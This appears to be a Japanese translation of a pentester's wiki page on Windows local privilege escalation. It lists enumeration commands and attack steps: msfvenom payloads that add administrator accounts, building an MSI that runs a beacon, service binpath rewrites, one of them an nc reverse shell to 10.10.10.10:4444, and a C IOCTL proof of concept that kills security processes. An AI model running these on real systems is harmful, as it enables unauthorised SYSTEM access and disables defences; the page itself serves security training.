# Windows Local Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}

### **Windows local privilege escalation vectors を探すためのベストツール：** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

## 初歩的な Windows 理論

### Access Tokens

**Windows Access Tokens が何か分からない場合は、続行する前に次のページをお読みください：**


{{#ref}}
access-tokens.md
{{#endref}}

### ACLs - DACLs/SACLs/ACEs

**ACLs - DACLs/SACLs/ACEs についての詳細は次のページを確認してください：**


{{#ref}}
acls-dacls-sacls-aces.md
{{#endref}}

### Integrity Levels

**Windows の integrity levels が何か分からない場合は、続行する前に次のページをお読みください：**


{{#ref}}
integrity-levels.md
{{#endref}}

## Windows Security Controls

Windows には、システムの列挙を妨げたり、実行ファイルの実行を阻止したり、あなたの活動を検知したりするさまざまな仕組みがあります。privilege escalation の列挙を開始する前に、次のページを読み、これらの防御メカニズムをすべて列挙してください：


{{#ref}}
../authentication-credentials-uac-and-efs/
{{#endref}}

## System Info

### バージョン情報の列挙

Windows のバージョンに既知の脆弱性がないか確認してください（適用されているパッチも確認）。
```bash
systeminfo
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" #Get only that information
wmic qfe get Caption,Description,HotFixID,InstalledOn #Patches
wmic os get osarchitecture || echo %PROCESSOR_ARCHITECTURE% #Get system architecture
```

```bash
[System.Environment]::OSVersion.Version #Current OS version
Get-WmiObject -query 'select * from win32_quickfixengineering' | foreach {$_.hotfixid} #List all patches
Get-Hotfix -description "Security update" #List only "Security Update" patches
```
### バージョン Exploits

This [site](https://msrc.microsoft.com/update-guide/vulnerability) is handy for searching out detailed information about Microsoft security vulnerabilities. This database has more than 4,700 security vulnerabilities, showing the **massive attack surface** that a Windows environment presents.

**システム上で**

- _post/windows/gather/enum_patches_
- _post/multi/recon/local_exploit_suggester_
- [_watson_](https://github.com/rasta-mouse/Watson)
- [_winpeas_](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) _(Winpeasにはwatsonが組み込まれています)_

**ローカル（システム情報あり）**

- [https://github.com/AonCyberLabs/Windows-Exploit-Suggester](https://github.com/AonCyberLabs/Windows-Exploit-Suggester)
- [https://github.com/bitsadmin/wesng](https://github.com/bitsadmin/wesng)

**exploits の Github リポジトリ:**

- [https://github.com/nomi-sec/PoC-in-GitHub](https://github.com/nomi-sec/PoC-in-GitHub)
- [https://github.com/abatchy17/WindowsExploits](https://github.com/abatchy17/WindowsExploits)
- [https://github.com/SecWiki/windows-kernel-exploits](https://github.com/SecWiki/windows-kernel-exploits)

### 環境

資格情報や重要な情報が環境変数に保存されていないか？
```bash
set
dir env:
Get-ChildItem Env: | ft Key,Value -AutoSize
```
### PowerShell の履歴
```bash
ConsoleHost_history #Find the PATH where is saved

type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type C:\Users\swissky\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
cat (Get-PSReadlineOption).HistorySavePath
cat (Get-PSReadlineOption).HistorySavePath | sls passw
```
### PowerShell トランスクリプトファイル

これを有効にする方法は以下で確認できます: [https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/](https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/)
```bash
#Check is enable in the registry
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
dir C:\Transcripts

#Start a Transcription session
Start-Transcript -Path "C:\transcripts\transcript0.txt" -NoClobber
Stop-Transcript
```
### PowerShell Module Logging

PowerShellのパイプライン実行の詳細が記録されます。実行されたコマンド、コマンド呼び出し、スクリプトの一部などが含まれますが、実行の完全な詳細や出力結果がすべて捕捉されるとは限りません。

これを有効にするには、ドキュメントの "Transcript files" セクションの手順に従い、**"Module Logging"** を **"Powershell Transcription"** の代わりに選択してください。
```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
```
PowersShell ログの直近 15 件のイベントを表示するには、次を実行します:
```bash
Get-WinEvent -LogName "windows Powershell" | select -First 15 | Out-GridView
```
### PowerShell **Script Block Logging**

スクリプトの実行に関する完全なアクティビティと全コンテンツの記録が取得され、各コードブロックが実行される際に確実に記録されます。このプロセスは各アクティビティの包括的な監査証跡を保持し、フォレンジックや悪意ある挙動の分析に有用です。実行時点で全ての活動を記録することで、プロセスに関する詳細な洞察が得られます。
```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
```
Script Block のログイベントは、Windows Event Viewer の次のパスにあります: **Application and Services Logs > Microsoft > Windows > PowerShell > Operational**。\
直近20件のイベントを表示するには次を使用します:
```bash
Get-WinEvent -LogName "Microsoft-Windows-Powershell/Operational" | select -first 20 | Out-Gridview
```
### インターネット設定
```bash
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
reg query "HKLM\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
```
### Drives
```bash
wmic logicaldisk get caption || fsutil fsinfo drives
wmic logicaldisk get caption,description,providername
Get-PSDrive | where {$_.Provider -like "Microsoft.PowerShell.Core\FileSystem"}| ft Name,Root
```
## WSUS

更新が http**S** ではなく http で要求されている場合、システムを侵害できる可能性があります。

まず、ネットワークが非SSLの WSUS 更新を使用しているかどうかを確認するため、cmd で次のコマンドを実行します:
```
reg query HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate /v WUServer
```
または、PowerShellで次のように:
```
Get-ItemProperty -Path HKLM:\Software\Policies\Microsoft\Windows\WindowsUpdate -Name "WUServer"
```
次のような返信を受け取った場合:
```bash
HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\WindowsUpdate
WUServer    REG_SZ    http://xxxx-updxx.corp.internal.com:8535
```

```bash
WUServer     : http://xxxx-updxx.corp.internal.com:8530
PSPath       : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\software\policies\microsoft\windows\windowsupdate
PSParentPath : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\software\policies\microsoft\windows
PSChildName  : windowsupdate
PSDrive      : HKLM
PSProvider   : Microsoft.PowerShell.Core\Registry
```
And if `HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate\AU /v UseWUServer` or `Get-ItemProperty -Path hklm:\software\policies\microsoft\windows\windowsupdate\au -name "usewuserver"` is equals to `1`.

Then, **it is exploitable.** If the last registry is equals to 0, then, the WSUS entry will be ignored.

In orther to exploit this vulnerabilities you can use tools like: [Wsuxploit](https://github.com/pimps/wsuxploit), [pyWSUS ](https://github.com/GoSecure/pywsus)- These are MiTM weaponized exploits scripts to inject 'fake' updates into non-SSL WSUS traffic.

Read the research here:

{{#file}}
CTX_WSUSpect_White_Paper (1).pdf
{{#endfile}}

**WSUS CVE-2020-1013**

[**Read the complete report here**](https://www.gosecure.net/blog/2020/09/08/wsus-attacks-part-2-cve-2020-1013-a-windows-10-local-privilege-escalation-1-day/).\
Basically, this is the flaw that this bug exploits:

> ローカルユーザーのプロキシを変更できる権限があり、Windows Update が Internet Explorer の設定で構成されたプロキシを使用している場合、ローカルで [PyWSUS](https://github.com/GoSecure/pywsus) を実行して自分のトラフィックを傍受し、アセット上で昇格したユーザーとしてコードを実行することが可能になります。
>
> さらに、WSUS サービスは現在のユーザーの設定を使用するため、その証明書ストアも使用します。WSUS ホスト名に対して自己署名証明書を生成し、それを現在のユーザーの証明書ストアに追加すれば、HTTP と HTTPS 両方の WSUS トラフィックを傍受できます。WSUS は証明書に対して HSTS-like なメカニズムや初回信頼（trust-on-first-use）型の検証を実装していません。提示された証明書がユーザーによって信頼され、ホスト名が一致していれば、サービスによって受け入れられます。

You can exploit this vulnerability using the tool [**WSUSpicious**](https://github.com/GoSecure/wsuspicious) (once it's liberated).

## Third-Party Auto-Updaters and Agent IPC (local privesc)

多くのエンタープライズエージェントは localhost の IPC インターフェースと特権付きの更新チャネルを公開しています。enrollment が攻撃者サーバーに強制され、updater が不正な root CA や弱い署名検証を信頼する場合、ローカルユーザーが悪意ある MSI を配信し、SYSTEM サービスがそれをインストールしてしまう可能性があります。一般化された手法（Netskope stAgentSvc チェーンに基づく – CVE-2025-0309）はここを参照してください：

{{#ref}}
abusing-auto-updaters-and-ipc.md
{{#endref}}

## KrbRelayUp

Windows のドメイン環境において、特定の条件下で **local privilege escalation** の脆弱性が存在します。これらの条件には、**LDAP signing が強制されていない**環境、ユーザーが **Resource-Based Constrained Delegation (RBCD)** を設定できるセルフライト権限を持っていること、そしてドメイン内でコンピュータを作成できる能力が含まれます。これらの要件はデフォルト設定で満たされることが重要です。

Find the **exploit in** [**https://github.com/Dec0ne/KrbRelayUp**](https://github.com/Dec0ne/KrbRelayUp)

For more information about the flow of the attack check [https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/](https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/)

## AlwaysInstallElevated

**If** these 2 registers are **enabled** (value is **0x1**), then users of any privilege can **install** (execute) `*.msi` files as NT AUTHORITY\\**SYSTEM**.
```bash
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```
### Metasploit payloads
```bash
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi-nouac -o alwe.msi #No uac format
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi -o alwe.msi #Using the msiexec the uac wont be prompted
```
If you have a meterpreter session you can automate this technique using the module **`exploit/windows/local/always_install_elevated`**

### PowerUP

`Write-UserAddMSI` コマンドを power-up から使用して、現在のディレクトリ内に特権を昇格させる Windows MSI バイナリを作成します。  
このスクリプトは、ユーザー/グループ追加を促すプリコンパイル済みの MSI インストーラーを書き出します（そのため GIU アクセスが必要です）：
```
Write-UserAddMSI
```
作成したバイナリを実行するだけで権限を昇格できます。

### MSI Wrapper

このチュートリアルを読んで、これらのツールを使ってMSI wrapperを作成する方法を学んでください。注意：**.bat** ファイルをラップでき、**単に** **コマンドライン** を **実行** したいだけの場合に有用です。


{{#ref}}
msi-wrapper.md
{{#endref}}

### Create MSI with WIX


{{#ref}}
create-msi-with-wix.md
{{#endref}}

### Create MSI with Visual Studio

- Cobalt Strike または Metasploit を使って、`C:\privesc\beacon.exe` に **new Windows EXE TCP payload** を **Generate** します。
- Visual Studio を開き、Create a new project を選択し、検索ボックスに "installer" と入力します。Setup Wizard プロジェクトを選んで Next をクリックします。
- プロジェクトに名前（例: **AlwaysPrivesc**）を付け、ロケーションに **`C:\privesc`** を使用し、'place solution and project in the same directory' を選択して Create をクリックします。
- Next をクリックし続け、ステップ 3/4 (choose files to include) に到達するまで進めます。Add をクリックして先ほど生成した Beacon ペイロードを選択し、Finish をクリックします。
- Solution Explorer で **AlwaysPrivesc** プロジェクトをハイライトし、Properties で **TargetPlatform** を **x86** から **x64** に変更します。
- Author や Manufacturer といった、インストールされたアプリをより正当らしく見せるために変更できるプロパティが他にもあります。
- プロジェクトを右クリックして View > Custom Actions を選択します。
- Install を右クリックして Add Custom Action を選択します。
- Application Folder をダブルクリックし、あなたの **beacon.exe** ファイルを選択して OK をクリックします。これによりインストーラーが実行されるとすぐに beacon ペイロードが実行されます。
- Custom Action Properties の下で **Run64Bit** を **True** に変更します。
- 最後に、ビルドします。
- 警告 `File 'beacon-tcp.exe' targeting 'x64' is not compatible with the project's target platform 'x86'` が表示された場合は、プラットフォームが **x64** に設定されていることを確認してください。

### MSI Installation

悪意のある `.msi` ファイルのインストールをバックグラウンドで実行するには:
```
msiexec /quiet /qn /i C:\Users\Steve.INFERNO\Downloads\alwe.msi
```
この脆弱性を悪用するには次を使用できます: _exploit/windows/local/always_install_elevated_

## アンチウイルスと検出機構

### 監査設定

これらの設定は何が**記録**されるかを決定するため、注意する必要があります
```
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System\Audit
```
### WEF

Windows Event Forwarding は、ログがどこに送信されているかを知るのは興味深い。
```bash
reg query HKLM\Software\Policies\Microsoft\Windows\EventLog\EventForwarding\SubscriptionManager
```
### LAPS

**LAPS** は、**local Administrator passwords の管理**のために設計されており、ドメインに参加しているコンピュータ上で各パスワードが**ユニークでランダム化され、定期的に更新される**ことを保証します。これらのパスワードは Active Directory 内に安全に保存され、ACLs を通じて十分な権限が付与されたユーザーのみがアクセスでき、許可されている場合に local admin passwords を表示できます。


{{#ref}}
../active-directory-methodology/laps.md
{{#endref}}

### WDigest

有効な場合、**平文のパスワードが LSASS に保存されます** (Local Security Authority Subsystem Service).\
[**More info about WDigest in this page**](../stealing-credentials/credentials-protections.md#wdigest).
```bash
reg query 'HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest' /v UseLogonCredential
```
### LSA Protection

**Windows 8.1** 以降、Microsoft は Local Security Authority (LSA) に対する保護を強化しました。これにより、信頼されていないプロセスがそのメモリを **read its memory** したりコードを注入したりする試みは **block** され、システムはさらに保護されます.\

[**More info about LSA Protection here**](../stealing-credentials/credentials-protections.md#lsa-protection).
```bash
reg query 'HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\LSA' /v RunAsPPL
```
### Credentials Guard

**Credential Guard** は **Windows 10** で導入されました。目的は、デバイスに保存された資格情報を pass-the-hash attacks のような脅威から保護することです。| [**More info about Credentials Guard here.**](../stealing-credentials/credentials-protections.md#credential-guard)
```bash
reg query 'HKLM\System\CurrentControlSet\Control\LSA' /v LsaCfgFlags
```
### キャッシュされた資格情報

**ドメインの資格情報** は **Local Security Authority (LSA)** によって認証され、オペレーティングシステムのコンポーネントで使用されます。ユーザーのログオンデータが登録されたセキュリティパッケージによって認証されると、通常そのユーザーのドメインの資格情報が確立されます。\
[**More info about Cached Credentials here**](../stealing-credentials/credentials-protections.md#cached-credentials).
```bash
reg query "HKEY_LOCAL_MACHINE\SOFTWARE\MICROSOFT\WINDOWS NT\CURRENTVERSION\WINLOGON" /v CACHEDLOGONSCOUNT
```
## ユーザーとグループ

### ユーザーとグループの列挙

自分が所属するグループに、興味深い権限を持つものがないか確認してください。
```bash
# CMD
net users %username% #Me
net users #All local users
net localgroup #Groups
net localgroup Administrators #Who is inside Administrators group
whoami /all #Check the privileges

# PS
Get-WmiObject -Class Win32_UserAccount
Get-LocalUser | ft Name,Enabled,LastLogon
Get-ChildItem C:\Users -Force | select Name
Get-LocalGroupMember Administrators | ft Name, PrincipalSource
```
### 特権グループ

**特権グループに属している場合、権限を昇格できる可能性があります**。特権グループと、それらを悪用して権限を昇格させる方法については、以下を参照してください:


{{#ref}}
../active-directory-methodology/privileged-groups-and-token-privileges.md
{{#endref}}

### Token manipulation

**詳しくは** このページで **token** が何かを学んでください: [**Windows Tokens**](../authentication-credentials-uac-and-efs/index.html#access-tokens).\
以下のページを確認して、**興味深い token について学び**、それらを悪用する方法を習得してください:


{{#ref}}
privilege-escalation-abusing-tokens.md
{{#endref}}

### ログインユーザー / セッション
```bash
qwinsta
klist sessions
```
### ホームフォルダ
```bash
dir C:\Users
Get-ChildItem C:\Users
```
### パスワードポリシー
```bash
net accounts
```
### クリップボードの内容を取得する
```bash
powershell -command "Get-Clipboard"
```
## 実行中のプロセス

### ファイルとフォルダの権限

まず、プロセスを一覧表示して、**プロセスのコマンドライン内にパスワードが含まれていないか確認します**。\
実行中のバイナリを**上書きできるか**、またはバイナリフォルダに書き込み権限があるかを確認し、可能な[**DLL Hijacking attacks**](dll-hijacking/index.html)を悪用できるか調べます:
```bash
Tasklist /SVC #List processes running and services
tasklist /v /fi "username eq system" #Filter "system" processes

#With allowed Usernames
Get-WmiObject -Query "Select * from Win32_Process" | where {$_.Name -notlike "svchost*"} | Select Name, Handle, @{Label="Owner";Expression={$_.GetOwner().User}} | ft -AutoSize

#Without usernames
Get-Process | where {$_.ProcessName -notlike "svchost*"} | ft ProcessName, Id
```
常に[**electron/cef/chromium debuggers** running, you could abuse it to escalate privileges](../../linux-hardening/privilege-escalation/electron-cef-chromium-debugger-abuse.md)が実行されていないか確認してください。

**プロセスのバイナリの権限を確認する**
```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v "system32"^|find ":"') do (
for /f eol^=^"^ delims^=^" %%z in ('echo %%x') do (
icacls "%%z"
2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo.
)
)
```
**プロセスのバイナリのフォルダの権限を確認する (**[**DLL Hijacking**](dll-hijacking/index.html)**)**
```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v
"system32"^|find ":"') do for /f eol^=^"^ delims^=^" %%y in ('echo %%x') do (
icacls "%%~dpy\" 2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users
todos %username%" && echo.
)
```
### Memory Password mining

実行中のプロセスのメモリダンプは sysinternals の **procdump** を使って作成できます。FTP のようなサービスはメモリ内に **credentials in clear text in memory** を保持していることがあるため、メモリをダンプして資格情報を読み取ってみてください。
```bash
procdump.exe -accepteula -ma <proc_name_tasklist>
```
### 安全でない GUI アプリ

**SYSTEM として動作するアプリケーションは、ユーザーに CMD を起動させたり、ディレクトリを閲覧させたりする可能性があります。**

例: "Windows Help and Support" (Windows + F1) で "command prompt" を検索し、"Click to open Command Prompt" をクリック

## サービス

Service Triggers により、特定の条件が発生したときに Windows がサービスを起動できます（named pipe/RPC endpoint activity、ETW events、IP availability、device arrival、GPO refresh など）。SERVICE_START 権限がなくても、トリガーを発動することで特権サービスを起動できることがよくあります。列挙や起動の手法は以下を参照してください:

-
{{#ref}}
service-triggers.md
{{#endref}}

サービスの一覧を取得する:
```bash
net start
wmic service list brief
sc query
Get-Service
```
### 権限

サービスの情報を取得するために**sc**を使用できます。
```bash
sc qc <service_name>
```
各サービスに必要な特権レベルを確認するために、_Sysinternals_ のバイナリ **accesschk** を用意しておくことを推奨します。
```bash
accesschk.exe -ucqv <Service_Name> #Check rights for different groups
```
「Authenticated Users」が任意のサービスを変更できるか確認することをおすすめします:
```bash
accesschk.exe -uwcqv "Authenticated Users" * /accepteula
accesschk.exe -uwcqv %USERNAME% * /accepteula
accesschk.exe -uwcqv "BUILTIN\Users" * /accepteula 2>nul
accesschk.exe -uwcqv "Todos" * /accepteula ::Spanish version
```
[You can download accesschk.exe for XP for here](https://github.com/ankh2054/windows-pentest/raw/master/Privelege/accesschk-2003-xp.exe)

### サービスを有効にする

次のエラーが発生している場合（例: SSDPSRV）:

_System error 1058 has occurred._\
_The service cannot be started, either because it is disabled or because it has no enabled devices associated with it._

次のように有効化できます。
```bash
sc config SSDPSRV start= demand
sc config SSDPSRV obj= ".\LocalSystem" password= ""
```
**サービス upnphost は動作するために SSDPSRV に依存していることを考慮してください（XP SP1 向け）**

**この問題の別の回避策**は以下を実行することです:
```
sc.exe config usosvc start= auto
```
### **サービス実行ファイルのパスを変更**

サービスに対して "Authenticated users" グループが **SERVICE_ALL_ACCESS** を持っている場合、サービスの実行可能バイナリを変更することが可能です。変更して **sc** を実行するには:
```bash
sc config <Service_Name> binpath= "C:\nc.exe -nv 127.0.0.1 9988 -e C:\WINDOWS\System32\cmd.exe"
sc config <Service_Name> binpath= "net localgroup administrators username /add"
sc config <Service_Name> binpath= "cmd \c C:\Users\nc.exe 10.10.10.10 4444 -e cmd.exe"

sc config SSDPSRV binpath= "C:\Documents and Settings\PEPE\meter443.exe"
```
### サービスを再起動
```bash
wmic service NAMEOFSERVICE call startservice
net stop [service name] && net start [service name]
```
特権は以下のさまざまな権限を通じて昇格できます:

- **SERVICE_CHANGE_CONFIG**: サービスバイナリの再構成を許可します。
- **WRITE_DAC**: 権限の再設定を可能にし、サービスの設定を変更できるようになります。
- **WRITE_OWNER**: 所有権の取得および権限の再設定を許可します。
- **GENERIC_WRITE**: サービスの設定を変更する権限を含みます。
- **GENERIC_ALL**: 同様にサービス設定を変更する権限を含みます。

この脆弱性の検出と悪用には _exploit/windows/local/service_permissions_ を使用できます。

### サービスバイナリの弱い権限設定

**サービスによって実行されるバイナリを変更できるか**、またはバイナリが置かれているフォルダに**書き込み権限があるか**を確認してください ([**DLL Hijacking**](dll-hijacking/index.html))**.**\  
サービスによって実行されるすべてのバイナリは **wmic**（system32内は除く）で取得でき、**icacls** で権限を確認できます:
```bash
for /f "tokens=2 delims='='" %a in ('wmic service list full^|find /i "pathname"^|find /i /v "system32"') do @echo %a >> %temp%\perm.txt

for /f eol^=^"^ delims^=^" %a in (%temp%\perm.txt) do cmd.exe /c icacls "%a" 2>nul | findstr "(M) (F) :\"
```
また **sc** と **icacls** も使用できます：
```bash
sc query state= all | findstr "SERVICE_NAME:" >> C:\Temp\Servicenames.txt
FOR /F "tokens=2 delims= " %i in (C:\Temp\Servicenames.txt) DO @echo %i >> C:\Temp\services.txt
FOR /F %i in (C:\Temp\services.txt) DO @sc qc %i | findstr "BINARY_PATH_NAME" >> C:\Temp\path.txt
```
### サービスレジストリの変更権限

任意のサービスレジストリを変更できるか確認してください。\\
次のようにサービスレジストリに対する**権限**を**確認**できます:
```bash
reg query hklm\System\CurrentControlSet\Services /s /v imagepath #Get the binary paths of the services

#Try to write every service with its current content (to check if you have write permissions)
for /f %a in ('reg query hklm\system\currentcontrolset\services') do del %temp%\reg.hiv 2>nul & reg save %a %temp%\reg.hiv 2>nul && reg restore %a %temp%\reg.hiv 2>nul && echo You can modify %a

get-acl HKLM:\System\CurrentControlSet\services\* | Format-List * | findstr /i "<Username> Users Path Everyone"
```
**Authenticated Users** または **NT AUTHORITY\INTERACTIVE** が `FullControl` 権限を持っているかを確認してください。もしそうであれば、サービスによって実行されるバイナリを変更できます。

実行されるバイナリのパスを変更するには:
```bash
reg add HKLM\SYSTEM\CurrentControlSet\services\<service_name> /v ImagePath /t REG_EXPAND_SZ /d C:\path\new\binary /f
```
### Services レジストリの AppendData/AddSubdirectory 権限

レジストリに対してこの権限を持っている場合、これはつまり**このレジストリからサブレジストリを作成できる**ことを意味します。Windows のサービスの場合、これは**任意のコードを実行するのに十分です：**

{{#ref}}
appenddata-addsubdirectory-permission-over-service-registry.md
{{#endref}}

### Unquoted Service Paths

実行ファイルのパスが引用符で囲まれていないと、Windows はスペースより前の各部分を順に実行しようとします。

例えば、パス _C:\Program Files\Some Folder\Service.exe_ の場合、Windows は以下を実行しようとします:
```bash
C:\Program.exe
C:\Program Files\Some.exe
C:\Program Files\Some Folder\Service.exe
```
組み込みの Windows サービスに属するものを除き、引用符で囲まれていないサービスパスをすべて列挙する:
```bash
wmic service get name,pathname,displayname,startmode | findstr /i auto | findstr /i /v "C:\Windows\\" | findstr /i /v '\"'
wmic service get name,displayname,pathname,startmode | findstr /i /v "C:\\Windows\\system32\\" |findstr /i /v '\"'  # Not only auto services

# Using PowerUp.ps1
Get-ServiceUnquoted -Verbose
```

```bash
for /f "tokens=2" %%n in ('sc query state^= all^| findstr SERVICE_NAME') do (
for /f "delims=: tokens=1*" %%r in ('sc qc "%%~n" ^| findstr BINARY_PATH_NAME ^| findstr /i /v /l /c:"c:\windows\system32" ^| findstr /v /c:""""') do (
echo %%~s | findstr /r /c:"[a-Z][ ][a-Z]" >nul 2>&1 && (echo %%n && echo %%~s && icacls %%s | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%") && echo.
)
)
```

```bash
gwmi -class Win32_Service -Property Name, DisplayName, PathName, StartMode | Where {$_.StartMode -eq "Auto" -and $_.PathName -notlike "C:\Windows*" -and $_.PathName -notlike '"*'} | select PathName,DisplayName,Name
```
この脆弱性は metasploit を使って**検出および exploit できます**: `exploit/windows/local/trusted\_service\_path`  
サービスバイナリは metasploit を使って手動で作成できます:
```bash
msfvenom -p windows/exec CMD="net localgroup administrators username /add" -f exe-service -o service.exe
```
### 回復アクション

Windowsでは、サービスが失敗した場合に実行するアクションをユーザーが指定できます。この機能はバイナリを指定するように設定できます。そのバイナリを置き換えられる場合、権限昇格が可能になることがあります。詳細は[official documentation](<https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2008-R2-and-2008/cc753662(v=ws.11)?redirectedfrom=MSDN>)を参照してください。

## アプリケーション

### インストール済みアプリケーション

**バイナリの権限**を確認し（上書きできれば権限昇格が可能かもしれません）、**フォルダ**の権限も確認してください（[DLL Hijacking](dll-hijacking/index.html)）。
```bash
dir /a "C:\Program Files"
dir /a "C:\Program Files (x86)"
reg query HKEY_LOCAL_MACHINE\SOFTWARE

Get-ChildItem 'C:\Program Files', 'C:\Program Files (x86)' | ft Parent,Name,LastWriteTime
Get-ChildItem -path Registry::HKEY_LOCAL_MACHINE\SOFTWARE | ft Name
```
### 書き込み権限

設定ファイルを変更して特定のファイルを読み取れるか、または Administrator アカウントによって実行される予定のバイナリ（schedtasks）を変更できるか確認してください。

システム内の脆弱なフォルダ／ファイルの権限を見つける方法の一つは、次のように実行することです：
```bash
accesschk.exe /accepteula
# Find all weak folder permissions per drive.
accesschk.exe -uwdqs Users c:\
accesschk.exe -uwdqs "Authenticated Users" c:\
accesschk.exe -uwdqs "Everyone" c:\
# Find all weak file permissions per drive.
accesschk.exe -uwqs Users c:\*.*
accesschk.exe -uwqs "Authenticated Users" c:\*.*
accesschk.exe -uwdqs "Everyone" c:\*.*
```

```bash
icacls "C:\Program Files\*" 2>nul | findstr "(F) (M) :\" | findstr ":\ everyone authenticated users todos %username%"
icacls ":\Program Files (x86)\*" 2>nul | findstr "(F) (M) C:\" | findstr ":\ everyone authenticated users todos %username%"
```

```bash
Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'Everyone'} } catch {}}

Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'BUILTIN\Users'} } catch {}}
```
### スタートアップで実行

**別のユーザによって実行されるレジストリやバイナリを上書きできるか確認する。**\
**読む** **以下のページ** を見て、興味深い **autoruns locations to escalate privileges** について詳しく学んでください:


{{#ref}}
privilege-escalation-with-autorun-binaries.md
{{#endref}}

### ドライバー

可能性のある**サードパーティの脆弱/不審な**ドライバーを探す
```bash
driverquery
driverquery.exe /fo table
driverquery /SI
```
If a driver exposes an arbitrary kernel read/write primitive (common in poorly designed IOCTL handlers), you can escalate by stealing a SYSTEM token directly from kernel memory. See the step‑by‑step technique here:

{{#ref}}
arbitrary-kernel-rw-token-theft.md
{{#endref}}

#### レジストリハイブのメモリ破損プリミティブ

現代のハイブ脆弱性は、決定論的なレイアウトを整え、書き込み可能な HKLM/HKU の子孫を悪用し、メタデータの破損をカスタムドライバなしでカーネル paged-pool オーバーフローに変換することを可能にします。フルチェーンはここを参照:

{{#ref}}
windows-registry-hive-exploitation.md
{{#endref}}

#### デバイスオブジェクトで FILE_DEVICE_SECURE_OPEN が設定されていないことを悪用する (LPE + EDR kill)

一部の署名済みサードパーティドライバは IoCreateDeviceSecure を使って強力な SDDL でデバイスオブジェクトを作成するが、DeviceCharacteristics に FILE_DEVICE_SECURE_OPEN を設定し忘れていることがあります。このフラグがないと、デバイスが余分なコンポーネントを含むパスを通じてオープンされた場合に secure DACL が強制されず、非特権ユーザが次のような名前空間パスを使ってハンドルを取得できます:

- \\ .\\DeviceName\\anything
- \\ .\\amsdk\\anyfile (from a real-world case)

ユーザがそのデバイスをオープンできると、ドライバが公開する特権 IOCTL が LPE や改ざんに悪用される可能性があります。実際に観測された機能例:
- 任意プロセスへフルアクセスのハンドルを返す（token theft / SYSTEM shell via DuplicateTokenEx/CreateProcessAsUser）。
- 制限なしの raw disk 読み書き（オフライン改ざん、起動時永続化トリック）。
- 任意のプロセスを終了させる、Protected Process/Light (PP/PPL) を含む — これによりカーネル経由でユーザ空間から AV/EDR を kill できる。

最小 PoC パターン（ユーザモード）：
```c
// Example based on a vulnerable antimalware driver
#define IOCTL_REGISTER_PROCESS  0x80002010
#define IOCTL_TERMINATE_PROCESS 0x80002048

HANDLE h = CreateFileA("\\\\.\\amsdk\\anyfile", GENERIC_READ|GENERIC_WRITE, 0, 0, OPEN_EXISTING, 0, 0);
DWORD me = GetCurrentProcessId();
DWORD target = /* PID to kill or open */;
DeviceIoControl(h, IOCTL_REGISTER_PROCESS,  &me,     sizeof(me),     0, 0, 0, 0);
DeviceIoControl(h, IOCTL_TERMINATE_PROCESS, &target, sizeof(target), 0, 0, 0, 0);
```
開発者向けの緩和策
- DACL で制限することを意図したデバイスオブジェクトを作成するときは常に FILE_DEVICE_SECURE_OPEN を設定する。
